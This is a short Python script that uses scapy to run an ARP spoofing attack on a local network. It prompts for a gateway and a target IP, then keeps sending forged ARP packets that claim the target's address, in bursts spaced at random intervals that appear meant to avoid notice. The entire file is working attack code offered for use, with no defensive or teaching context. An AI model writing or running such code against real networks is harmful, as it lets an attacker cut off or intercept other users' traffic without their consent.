import os
import time
import random
from scapy.all import *

gatewayIP = '192.168.170.254'
sendInter = 0.5
packetCount = 5
sleepInter = (120, 300)


def arpattack(gatewayIP, targetIP):
    while True:
        print('[Info] Target IP:', targetIP)
        pkt = ARP(psrc=targetIP, pdst=gatewayIP, op=1)
        srloop(pkt, inter=sendInter, count=packetCount)
        print('[Info] Waiting for the next packet transmission...')
        sleepTime = random.randint(*sleepInter)
        print('[Debug] Intermittent:', sleepTime)
        time.sleep(sleepTime)


def main():
    stat = 1
    while stat != 0:
        gatewayIP = input('Please enter gateway IP: ')
        targetIP = input('Please enter target IP: ')
        stat = 0
        if gatewayIP == 'exit' or targetIP == 'exit':
            print('[Info] Exit')
            return (2)

    try:
        arpattack(gatewayIP, targetIP)

    except KeyboardInterrupt:
        print('[Info] Break')
        return (1)
    except Exception as f:
        print('[Fatal] {}'.format(f))
        return (1)


if __name__ == '__main__':
    while True:
        if main() == 2:
            print('[Info] Exit')
            break